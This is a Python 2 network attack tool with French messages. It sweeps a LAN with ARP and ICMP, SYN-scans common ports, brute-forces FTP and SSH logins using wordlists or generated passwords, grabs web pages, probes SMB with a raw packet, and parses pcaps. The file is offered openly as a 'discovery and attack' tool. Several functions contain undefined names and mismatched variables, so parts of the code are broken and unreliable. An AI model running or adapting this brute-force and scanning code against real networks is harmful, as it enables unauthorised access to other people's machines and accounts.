#!/usr/bin/env python2
#-*- coding:utf-8 -*-

__author__='''
[Cs133]
Twitter: @133_cesium
'''
__description__='''
The aim of this is to discover who is online in the neightborhood of the same LAN (at the office for example...)
And if some known ports are open and in listenning mode, we try to access them the hard way. :)
That simple.

Steps:
------
1st: ARP check on LAN/24
2nd: Discovering sequence (Hostname for example, if shared) and port scan
3rd: Attacking attempts by BF
'''
__license__='''
<+> Under the terms of the GPL v3 License.
'''

import sys
import math
import errno
import socket
import logging
import requests
import scapy.route
import scapy.config
from ftplib import FTP
import scapy.layers.l2
from scapy.all import *
from time import strftime
from random import randint
from threading import Thread
from datetime import datetime
from argparse import ArgumentParser
from paramiko import SSHClient, AutoAddPolicy
from string import digits, ascii_lowercase, uppercase, hexdigits, letters, punctuation

known_ports 	= [21,22,2222,25,80,443,445,8080,8000]
letters_digits  = digits + letters
all		= digits + letters + punctuation
online  	= {}
ips_o,pwd	= [],[]
SYNACK  	= 0x12
flag,ftop	= 0,0

logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s',
		    datefmt='%Y-%m-%d %H:%M:%S',
		    level=logging.DEBUG)
logger = logging.getLogger(__name__)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def pwd_alpha(lgr, mode):
	if mode == 'lower':
		return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
	elif mode == 'upper':
		return ''.join(uppercase[randint(0,len(uppercase)-1)] for i in range(int(lgr)))
	elif mode == 'digits':
		return ''.join(digits[randint(0,len(digits)-1)] for i in range(int(lgr)))
	elif mode == 'hex':
		return ''.join(hexdigits[randint(0,len(hexdigits)-1)] for i in range(int(lgr)))
	elif mode == 'all':
		return ''.join(all[randint(0,len(all)-1)] for i in range(int(lgr)))
	else:
		return ''.join(letters_digits[randint(0,len(letters_digits)-1)] for i in range(int(lgr)))

def generate(mode, lgr):
	stop = False
	if mode == 'lower':
		len_mode = pow(len(ascii_lowercase), int(lgr))
	elif mode == 'upper':
		len_mode = pow(len(uppercase), int(lgr))
	elif mode == 'digits':
		len_mode = pow(len(digits), int(lgr))
	elif mode == 'hex':
		len_mode = pow(len(hexdigits), int(lgr))
	elif mode == 'all':
		len_mode = pow(len(all), int(lgr))
	else:
		len_mode = pow(len(lc_digits), int(lgr))
	try:
		while stop != True:
			psswd = pwd_alpha(lgr, mode)
			if psswd not in pwd: pwd.append(psswd)
			sys.stdout.write('\r\033[96m[+]\033[0m Remplissage du dictionnaire [/!\\ en mémoire] : ' +
					 str(len(pwd)) + ' / '+ str(len_mode))
			sys.stdout.flush()
			if len(pwd) == len_mode:
				stop = True
				sys.stdout.write('\n\033[94m[+]\033[0m Dictionnaire généré en totalité.\n')
	except KeyboardInterrupt:
		sys.stdout.write('\n\033[94m[+]\033[0m Génération interrompue avec succès. Longueur : %d.\n\n' % len(pwd))
		return pwd
	return pwd

def detonate(log, addr, psswd, essai):
	global ftop
	trig = FTP(addr)
	try:
		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + psswd)
		sys.stdout.flush()
		ret = trig.login(user=log,passwd=psswd)
		trig.quit()
		if "successful" in ret:
			ftop = 1
			sys.stdout.write('\n\n\033[91m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
	except:
		trig.close()

def ssh_conn(log, addr, passwd, essau):
	global flag
	try:
		client = SSHClient()
		client.set_missing_host_key_policy(AutoAddPolicy())
		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + passwd)
		sys.stdout.flush()
		client.connect(addr,
			username=log,
			password=psswd,
			timeout=10,
			look_for_keys=False)
		print '\n\n\033[91m[+]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
		flag = 1
	except:
		pass

def query(port, dst):
	if port == 443:
		url = 'https://{}'.format(dst)
	else:
		url = 'http://{}:{}'.format(dst, port)
	cooki	= {'spip_session':pwd_alpha(16, 'alpha')}
	token	= {'token':pwd_alpha(16, 'alpha')}
	headers = {'content-type':'application/json'}
	r = requests.get(url, headers=headers, verify=False)
	logger.info("\033[92m[*]\033[0m {}: \033[91m{}\033[0m".format(dst, r.status_code))
 	return r.text.encode('utf-8')

def long2net(arg):
	if (arg <= 0 or arg >= 0xFFFFFFFF):
		raise ValueError("\033[91m[-]\033[0m Valeur du masque illégale.", hex(arg))
	return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))

def to_CIDR_notation(bytes_network, bytes_netmask):
	network = scapy.utils.ltoa(bytes_network)
	netmask = long2net(bytes_netmask)
	net = "%s/%s" % (network, netmask)
	if netmask < 16:
		logger.warn("\033[91m[-]\033[0m %s est trop gros." % net)
		return None
	return net

def scan_and_print_neighbors(net, interface, timeout=1):
	global ips_o
	print "\n\033[94m[+]\033[0m ARP %s sur %s" % (net, interface)
	try:
		ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
		for s, r in ans.res:
			line = r.sprintf("%Ether.src%  %ARP.psrc%")
			ips_o.append(line.split(' ')[2])
			try:
				hostname = socket.gethostbyaddr(r.psrc)
				line += " " + hostname[0]
			except socket.herror:
				pass
			except KeyboardInterrupt:
				print '\033[91m[-]\033[0m L\'utilisateur a choisi l\'interruption du process.'
				break
			logger.info("\033[92m[*]\033[0m " + line)
	except socket.error as e:
		if e.errno == errno.EPERM:
			logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
		else:
			raise

def local_network_scan():
	for network, netmask, _, interface, address in scapy.config.conf.route.routes:
		if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
			continue
		if netmask <= 0 or netmask == 0xFFFFFFFF:
			continue
		net = to_CIDR_notation(network, netmask)
		if interface != scapy.config.conf.iface:
			logger.warn("\033[92m[*]\033[0m Ignore %s car Scapy ne supporte pas ce type d'interface.", net)
			continue
		if net:
			scan_and_print_neighbors(net, interface)

def checkhost(ip):
	global ips_o
	conf.verb = 0
	try:
		ping, no = sr(IP(dst=ip)/ICMP(), timeout=1.5, retry=-2)
		if ping.res:
			logger.info("\033[96m[+]\033[0m La cible est en ligne : " + ip)
			ips_o.append(ip)
        except socket.error as e:
                if e.errno == errno.EPERM:
                        logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
                else:
                        pass
	except Exception as e:
		logger.error("\033[91m[-]\033[0m %s.", e.strerror)
		pass

def network_scan(ip):
	mask 	  = [255,255,255,0]
	ipf 	  = ip.split('.')
	pre 	  = [str(int(ipf[i]) & mask[i]) for i in range(len(ipf))]
	ip_reseau = pre[0] + '.' + pre[1] + '.' + pre [2] + '.'
	relicat   = 255 - int(pre[3])
	all_hosts = relicat if relicat != 255 else 255
	return [ip_reseau + str(suffixe) for suffixe in range(int(pre[3]),all_hosts,1)]

def scanner(target):
	global online
	ports_i = []
	for port in known_ports:
		try:
			srcport = randint(20000,40000)
        		conf.verb = 0
        		SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
        		pktflags = SYNACKpkt.getlayer(TCP).flags
        		if pktflags == SYNACK:
				logger.info('\033[96m[+]\033[0m Port Ouvert : \033[33m{}\033[0m sur la cible --> {}'.format(port, target))
				ports_i.append(port)
	 		else:
	        		RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
				send(RSTpkt)
			online[target] = ports_i
		except KeyboardInterrupt:
			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
			send(RSTpkt)
			print "\n\033[92m[*]\033[0m La requete s'est stoppée sur demande utilisateur."
		except Exception as e:
			#logger.error("\033[91m[-]\033[0m {}: {}".format(e, target))
			pass

def port_scan(ip):
	global ips_o, online
	all_hosts = []
	if ip == get_ip():
		print '\n\033[92m[*]\033[0m Scan du réseau local:'
		local_network_scan()
		if not ips_o:
			sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
	else:
		print '\n\033[92m[*]\033[0m Scan du réseau distant:'
		all_hosts = network_scan(ip)
		threads = []
		for host in all_hosts:
			proc = Thread(target=checkhost,args=(host,))
			threads.append(proc)
			proc.start()
		for thr in threads:
			thr.join()
	if ips_o:
		print '\n\033[92m[*]\033[0m Scan de port sur les machines ARPées:'
		threads = []
		for ip in ips_o:
			proc = Thread(target=scanner,args=(ip,))
			threads.append(proc)
			proc.start()
		for thr in threads:
			thr.join()
	else:
		sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
	print '\n\033[92m[*]\033[0m Résumé du scan de ports:\n{}\n'.format(online)

def get_ip():
	try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8",80))
                ret = s.getsockname()[0]
                s.close()
                return ret
        except:
                sys.exit('\033[91m[-]\033[0m Déconnecté du réseau?\n')

def get_http_headers(http_payload):
	try:
        	headers_raw = http_payload[:http_payload.index("\r\n\r\n")+2]
        	headers = dict(re.findall(r'(?P<name>.*?):(?P<value>.*?)\r\n', headers_raw))
    	except:
        	return None
	if 'Content-Type' not in headers:
        	return None
    	return headers

def pcap(pc, protocol):
    	try:
        	pcap = rdpcap(pc)
        	p = pcap.sessions()
    	except IOError:
        	sys.exit("\033[91m[-]\033[0m IOError.")
    	for session in p:
		if protocol == 'http':
			idx, flag = 0, 0
			concat = ''
			print blu, '\n[ Nouvelle Session = %s ]' % p[session], nat
			for pkt in p[session]:
				if pkt.haslayer(TCP) and pkt.haslayer(Raw) and (pkt[TCP].flags == 24L or pkt[TCP].flags == 16):
					print '\033[91m\nPacket [ %d ] -------------- Nouveau Payload -------------\033[0m \n\n' % idx
					payload = pkt[TCP].payload
					load = pkt[TCP].load
					headers = get_http_headers(load)
					if headers is not None and ' gzip' in headers.values():
						print load[:15]
						for k,v in headers.iteritems():
							print k,':',v
						tab = load.split('\r\n')
						concat += tab[-1]
						flag = 1
					elif flag != 0 and headers is None:
						tab = load.split('\r\n')
						concat += tab[-1]
						try:
							sio = StringIO.StringIO(concat)
							gz = gzip.GzipFile(fileobj=sio)
							print gz.read()
							flag = 0
							concat = ''
						except:
							pass
					else:
						print payload
				idx += 1
		elif protocol == 'dns':
			#TODO
			pass

def get_args():
	args = ArgumentParser(version='2.1',description='Discovery and attack only, made by Cesium133.')
	args.add_argument('-b','--bruteforce',
		action='store_true',
		default=False,
		help='Argument optionnel pour déclencher le mode attaque.')
	args.add_argument('-i','--ip',
		action='store',
		nargs=1,
		help='Machine cible.')
	args.add_argument('-w','--wordlist',
		action='store',
		nargs=1,
		help='Ajout d\'un dictionnaire.')
	args.add_argument('-u','--username',
		action='store',
		nargs=1,
		default=['admin'],
		help='Username distant à BF.')
	args.add_argument('-m','--mode',
		action='store',
		nargs=1,
		default=['alpha'],
		help='Alphabet de bruteforce [lower | upper | digits | letters+digits | hex | all].')
	args.add_argument('-l','--longueur',
		action='store',
		nargs=1,
		default=['3'],
		help='Longueur des mots de passe souhaitée.')
	args.add_argument('-r','--rdpcap',
		action='store',
		nargs=1,
		help='Analyse un pcap pour déceler les requetes HTTP.')
	args.add_argument('-p','--protocol',
		action='store',
		nargs=1,
		default=['http'],
		help='Protocole à analyser.')
	return args.parse_args()


# Entry point
if __name__ == '__main__':
	args = get_args()
	user = args.username[0]
	print '\033[94m[+]\033[0m User:', user
	ip = get_ip() if args.ip is None else args.ip[0]
	print '\033[94m[+]\033[0m IP:', ip

#	from multiprocessing import Pool
#	with open(args.wordlist[0],'r') as dico:
#		pool = Pool(4)
#		pool.map(detonate,dico,4)

	if args.rdpcap is not None:
		pcap(args.pcap[0], args.protocol[0].lower())
		sys.exit(0)

	ips = network_scan(ip)
	port_scan(ip)

	if args.bruteforce:
		if args.wordlist is not None:
			try:
				print "\033[94m[+]\033[0m Prise en compte de la wordlist:", args.wordlist[0]
				with open(args.wordlist[0],'rb') as wl:
					dic = wl.read().replace('\r','').split('\n')
			except:
				print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
				sys.exit(-1)
		else:
			print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
			print "\033[94m[+]\033[0m Generation du dictionnaire."
			print "\033[92m[*]\033[0m Longueur des lignes:", args.longueur[0]
			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]\n"
			dic = generate(args.mode[0], args.longueur[0])

	if online is not None:
		for host in online:
# FTP ----------------------------------------------------------------------------------------------------------
			if args.bruteforce:
				idx = 0
				if 21 in online[host]:
					print "\n\033[33m[+]\033[0m Cible avec FTP ouvert : %s." % host
					try:
						threads = []
						for item in dic:
							t = Thread(target=detonate,args=(user,ip,item,idx,))
							threads.append(t)
							t.start()
							idx += 1
							if len(threads) >= 10:
								for thr in threads:
									thr.join()
								threads = []
							if ftop == 1:
								ftop = 0
								break
					except KeyboardInterrupt:
						print '\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
					except Exception as e:
						logger.error("\033[91m[-]\033[0m BF FTP.")
				idx = 0
# SSH ----------------------------------------------------------------------------------------------------------
				if 22 in online[host]:
					print "\n\033[31m[+]\033[0m Cible avec SSH ouvert : %s." % host
					try:
						threads = []
						for psswd in dic:
							conn = Thread(target=ssh_conn,args=(user,addr,psswd,idx,))
							threads.append(t)
							conn.start()
							idx += 1
							if len(threads) >= 10:
								for thr in threads:
									thr.join()
								threads = []
							if flag == 1:
								flag = 0
								break
					except KeyboardInterrupt:
						print '\n\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
					except Exception as e:
						logger.error("\033[91m[-]\033[0m BF SSH")
# HTTP ---------------------------------------------------------------------------------------------------------
			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
				port_idx = [x for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
				print "\n\033[35m[+]\033[0m Getting page -> Cible avec HTTP ouvert : {} sur le port {}.".format(host, port_idx[0])
				for item in port_idx:
					page = query(item, host)
					with open('HTTP-' + host + '-page.html','w') as f:
						f.write(page)
#					sniffed = sniff(prn=query(item, host),
#							filter="tcp and port " + str(item) + " and host " + host,
#							count=25)
#					sniffed.nsummary()
#					try:
#						wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
#					except:
#						pass
# HTTPS --------------------------------------------------------------------------------------------------------
			if 443 in online[host]:
				print "\n\033[1m[+]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
				page = query(443, host)
				with open('HTTPS-' + host + '-page.html','w') as f:
					f.write(page)
#				sniffed = sniff(prn=query(443, host),
#						filter="tcp and port 443 and host " + host,
#						count=25)
#				sniffed.nsummary()
#				try:
#					wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
#				except:
#					pass
# SMB ----------------------------------------------------------------------------------------------------------
			if 445 in online[host]:
				print "\n\033[36m[+]\033[0m Sniffing -> Cible avec SMB ouvert : %s." % host
				payload = "\x00\x00\x001\xffSMB+\x00\x00\x00\x00\x18C\xc0"+\
                                          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"+\
                                          "\x00\x00\xfe\xff\x01\x01\x00\x0c\x00JlJmIhClBsr\x00"
                                packet = IP(dst=host)/TCP(dport=445)/Raw(load=payload)
                                sniffed, unans = sr(packet, timeout=1.5, verbose=0, multi=True)
				sniffed.nsummary()
				try:
					wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
				except:
					pass
		sys.exit('\n\033[91m[+]\033[0m # Job done #\n')
	else:
		sys.exit('\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).')
